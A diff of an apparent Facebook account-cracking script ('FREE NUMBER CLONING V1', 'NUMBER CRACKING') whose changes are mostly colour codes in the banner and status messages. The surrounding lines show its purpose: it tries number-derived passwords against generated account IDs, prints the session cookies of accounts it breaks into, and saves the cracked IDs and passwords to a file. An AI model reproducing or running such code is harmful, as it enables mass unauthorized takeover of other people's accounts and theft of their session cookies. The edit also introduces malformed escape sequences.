@@ -62,20 +62,20 @@ today = date.today()
 os.system('xdg-open https://www.facebook.com/its.muhib.7?ref=share_group_link')
 os.system('xdg-open https://www.facebook.com/its.muhib.7?ref=share_group_link')
 logo =("""\033[1;92m
-   [1;92m███    ███[1;92m ██      ██[1;92m ██   ██[1;92m ██[1;92m ██████ 
-   [1;92m████  ████[1;92m ██      ██[1;92m ██   ██[1;92m ██[1;92m ██   ██
-   [1;92m██ ████ ██[1;92m ██      ██[1;92m ███████[1;92m ██[1;92m ██████
-   [1;92m██  ██  ██[1;92m ██      ██[1;92m ██   ██[1;92m ██[1;92m ██   ██
-   [1;92m██      ██[1;92m ██████████[1;92m ██   ██[1;92m ██[1;92m ██████
+  [1;92m███    ███[1;92m ██      ██[1;92m ██   ██[1;92m ██[1;92m ██████ 
+  [1;92m████  ████[1;92m ██      ██[1;92m ██   ██[1;92m ██[1;92m ██   ██
+  [1;92m██ ████ ██[1;92m ██      ██[1;92m ███████[1;92m ██[1;92m ██████   
+  [1;92m██  ██  ██[1;92m ██      ██[1;92m ██   ██[1;92m ██[1;92m ██   ██
+  [1;92m██      ██[1;92m ██████████[1;92m ██   ██[1;92m ██[1;92m ██████
 [1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗[1;92m
 [1;92m║  [1;97m[1;41m    FREE  NUMBER CLONING V1     [1;0m[1;92m║[1;92m
 [1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝[1;92m
 [1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗[1;92m
-[1;92m║➣ [1;91mDEVOLPER   :          MUHIB-143 [1;92m          ║
+[1;92m║➣ [1;92mDEVOLPER   :          MUHIB-143 [1;92m          ║
 [1;92m║➣ [1;92mFACEBOOK   :          MUHIB-143 [1;92m          ║
-[1;92m║➣ [1;93mWHATSAPP   :          01405744958 [1;92m        ║
-[1;92m║➣ [1;94mGITHUB     :          MUHIB-143[1;92m           ║
-[1;92m║➣ [1;95mTOOLS      :           NUMBER CRACKING[1;92m    ║
+[1;92m║➣ [1;92mWHATSAPP   :          01405744958 [1;92m        ║
+[1;92m║➣ [1;92GITHUB     :          MUHIB-143[1;92m           ║
+[1;92m║➣ [1;92mTOOLS      :           NUMBER CRACKING[1;92m    ║
 [1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
     """) 
 loop = 0
@@ -167,10 +167,10 @@ def xxr():
         jalan('\033[1;97m====================================================')
         jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL ID: {xr}'+tl)
         jalan(f'{x}[{xr}^{x}]\033[0;92m CRACKING PROCESS HAS BEEN STARTED')
-        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR SIM  ')
-        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUSE FLIGHT MODE FOR SPEED')
-        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mMUHIB-143 ON FIRE')
-        jalan('\033[1;97m====================================================')
+        jalan(f'\033[0;92m[{xr}^{x}]\033[0;93m USE YOUR SIM  ')
+        jalan(f'\033[0;92m[{xr}^{x}] \x1b[38;5;208mUSE FLIGHT MODE FOR SPEED')
+        jalan(f'\033[0;92m[{xr}^{x}] \033[0;95mMUHIB-143 ON FIRE')
+        jalan('\033[1;972====================================================')
         for love in user:
             pwx = [love[1:]]
             uid = code+love
@@ -221,7 +221,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[MUHIB-143 -OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[MUHIB-143 -OK] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[1;92m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/MUHIB-143 -OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
